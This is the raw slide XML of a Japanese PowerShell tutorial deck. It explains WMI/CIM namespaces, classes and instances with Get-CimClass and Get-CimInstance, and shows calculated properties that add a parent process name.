        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7643810" y="980728"/>
            <a:ext cx="3671890" cy="1044116"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7854"/>
            </a:avLst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902D2058-904C-69AF-AF51-61748B497B88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7643810" y="2189765"/>
            <a:ext cx="3673478" cy="1044116"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7854"/>
            </a:avLst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33" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{664BDB24-EED9-C5C1-B5D4-B8877FE0B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20" y="899428"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1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CimClass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34" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6734DE17-7AFB-8CB4-0FF8-884DEF74F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20" y="4210970"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1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CimInstance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F7E01ED0-A075-7A51-FEC7-0E9658492A1C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="890019" y="1291986"/>
            <a:ext cx="6502125" cy="1938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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CimClass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Namespace root/CIMV2 `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-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ClassName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> win32*process* | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a: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Win32_ProcessTrace     Win32_ProcessStart...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Win32_ProcessStopTrace Win32_Processor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Win32_Process          Win32_AssociatedPr...</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4A465D8F-848B-8C55-F8CA-0836204BF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337" y="3321324"/>
            <a:ext cx="6374792" cy="677108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既定の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Namespace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は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root/CIMV2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。一覧は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en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Ctrl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＋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Space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補完で確認できる。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2FAD036F-FA56-6DCF-A317-04803F6BD689}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="890019" y="4570092"/>
            <a:ext cx="6502125" cy="16312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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CimInstance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Class Win32_Processor</a:t>
            </a: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DeviceID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Name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-------- ----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CPU0     AMD Ryzen 7 PRO 5850U with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Radeo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>...</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .</a:t>
            </a:r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EC29187C-FA12-2CCD-140C-79A2ACC711D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7643810" y="3417388"/>
            <a:ext cx="3673478" cy="1044116"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7854"/>
            </a:avLst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15CEDBBB-DF5D-03FD-8905-C0B77DC794FF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7643810" y="980728"/>
            <a:ext cx="1620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Namespaces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DB69A469-258C-7DFF-1950-D2E2A8D2A084}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7643810" y="2195286"/>
            <a:ext cx="1620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bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Class</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>es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A506B4D9-5B96-C241-3708-75C6BE387F0E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8688708" y="1438844"/>
            <a:ext cx="1008572" cy="392791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ja-JP" sz="16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CIMV2</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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A7BD55FD-715C-F0AA-6B3A-F9BE7BA81EF5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="9750562" y="1435789"/>
            <a:ext cx="1476164" cy="392791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ja-JP" sz="16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subscription</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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326BDD9B-51F2-01A1-D11D-A86BF4417004}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8004212" y="2519345"/>
            <a:ext cx="1932691" cy="565146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ja-JP" sz="16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Win32_</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1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NetworkAdapter</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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739A5E73-D48A-2B7B-17D1-621CB70324E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="10008203" y="2519345"/>
            <a:ext cx="1272373" cy="565146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ja-JP" sz="16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Win32_</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1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DiskDrive</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="16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0AAFC697-5A85-7934-A61F-4EBA52F71DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7881041" y="3896546"/>
            <a:ext cx="1037704" cy="31892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ja-JP" sz="16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NIC01</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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ACB20070-3A8D-D805-F938-F9B9D7ADADC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8982732" y="3896546"/>
            <a:ext cx="1037704" cy="31892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ja-JP" sz="16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NIC02</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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46DDF6D2-830D-03A9-4ECB-83D41BAF6751}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="10121585" y="3898726"/>
            <a:ext cx="1037704" cy="31892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36000" rIns="108000" bIns="36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ja-JP" sz="1600" dirty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</a:rPr>
              <a:t>Disk00</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="16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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="51" name="コネクタ: カギ線 50">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BCC29118-22B4-87CD-0271-F09D2E7159B2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:stCxn id="43" idx="2"/>
            <a:endCxn id="46" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="16200000" flipH="1">
            <a:off x="9574837" y="1449792"/>
            <a:ext cx="687710" cy="1451396"/>
          </a:xfrm>
          <a:prstGeom prst="bentConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 40801"/>
            </a:avLst>
          </a:prstGeom>
          <a:ln/>
          <a:effectLst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3" name="コネクタ: カギ線 52">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4130513D-FD12-408E-3B28-778E420D7FDF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="43" idx="2"/>
            <a:endCxn id="45" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="8737921" y="2064272"/>
            <a:ext cx="687710" cy="222436"/>
          </a:xfrm>
          <a:prstGeom prst="bentConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 40801"/>
            </a:avLst>
          </a:prstGeom>
          <a:ln/>
          <a:effectLst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7" name="コネクタ: カギ線 56">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{400A26F0-3DCC-4EF8-82EE-008AB5BFD1C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="45" idx="2"/>
            <a:endCxn id="47" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="8279199" y="3205186"/>
            <a:ext cx="812055" cy="570665"/>
          </a:xfrm>
          <a:prstGeom prst="bentConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 30170"/>
            </a:avLst>
          </a:prstGeom>
          <a:ln/>
          <a:effectLst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1" name="コネクタ: カギ線 60">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B9F1BB23-5D82-C0FA-FCAE-06BC5AD13419}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="45" idx="2"/>
            <a:endCxn id="48" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="16200000" flipH="1">
            <a:off x="8830044" y="3225005"/>
            <a:ext cx="812055" cy="531026"/>
          </a:xfrm>
          <a:prstGeom prst="bentConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 30170"/>
            </a:avLst>
          </a:prstGeom>
          <a:ln/>
          <a:effectLst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5" name="コネクタ: カギ線 64">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{56FFC588-56DF-9684-9378-A90BE6C523EF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="46" idx="2"/>
            <a:endCxn id="49" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="10235297" y="3489632"/>
            <a:ext cx="814235" cy="3953"/>
          </a:xfrm>
          <a:prstGeom prst="bentConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:ln/>
          <a:effectLst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252FCD59-E230-06EF-ACF2-B8A63DCCD82C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7643810" y="3425084"/>
            <a:ext cx="1620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In</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>stances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EE9A8F0F-9AB2-66E9-DAAB-24E78B132E68}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8399894" y="4531309"/>
            <a:ext cx="29173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ja-JP" sz="1400" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>https://www.concurrency.com/blog/</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP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en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>august-2018/introduction-to-wmi</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP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223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FBD20980-7912-54F4-4A7D-E70444E87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プロセス </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>フィールド追加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C831E70-6F83-7646-E6D8-C6DEAEA76F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A16958A-80EC-8CA8-E1A0-4E3BCCE9B4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16</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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B1DDEDD3-5FB3-9F94-1D9E-E526F9827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858198"/>
            <a:ext cx="10440989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親プロセス名も表示する（＝プロパティを追加する）。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55C0B23-C6DE-B502-4B0E-091F8D60628C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1196752"/>
            <a:ext cx="10143556" cy="33239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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>CimInstance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Class Win32_Process -Filter "Name = 'svchost.exe'"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Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ProcessId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, Name, Path, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>parentProcessId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>,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@{Name = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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parentProcessName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'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  Expression = {(Get-Process -Id $_.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>parentProcessId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>).Name }}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Select-Object -First 1 | Format-List</a:t>
            </a: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ProcessId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>         : 1624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Name              : svchost.exe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Path              : C:\WINDOWS\system32\svchost.exe</a:t>
            </a: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parentProcessId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>   : 1452</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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parentProcessName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="20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</a:rPr>
              <a:t>: services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3861852-AA20-4765-C2F6-139BC13A7491}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1271464" y="1808820"/>
            <a:ext cx="8640960" cy="684076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C985EBA0-5C0D-D38D-5E89-5B174465E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336" y="4653136"/>
            <a:ext cx="10440989" cy="158504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緑枠の部分を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Calculated Properties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と呼ぶ。</a:t>
            </a:r>
          </a:p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ハッシュテーブル（連想配列）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@{}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でプロパティを定義する。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>@{Name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 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=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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>プロパティ名 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>';</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Expression = {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>定義式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>}}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endParaRPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea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37560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1BE8C4EF-4136-D70F-0FB0-09207500C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プロセス </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>の波括弧と丸括弧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AA86FE5-95A3-A336-5A77-FEAA435F2A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604875D-4B4E-4AE9-F76E-FFE189F1D5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17</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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255E399F-790C-E697-AA1A-733D7FA21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040" y="2195572"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>(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丸括弧</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC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77B16AA5-5F20-7098-1312-24817F8EF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20" y="2195572"/>
            <a:ext cx="4859340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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>{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波括弧</a:t>
            </a:r>
            <a:r>
              <a:rPr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: Script Block</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B05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}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1EE1D7B-5EA9-AFC1-DAF3-19398F78602B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1244950"/>
            <a:ext cx="10179560" cy="7078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&gt;&gt; @{Name = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>parentProcessName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'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  Expression = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
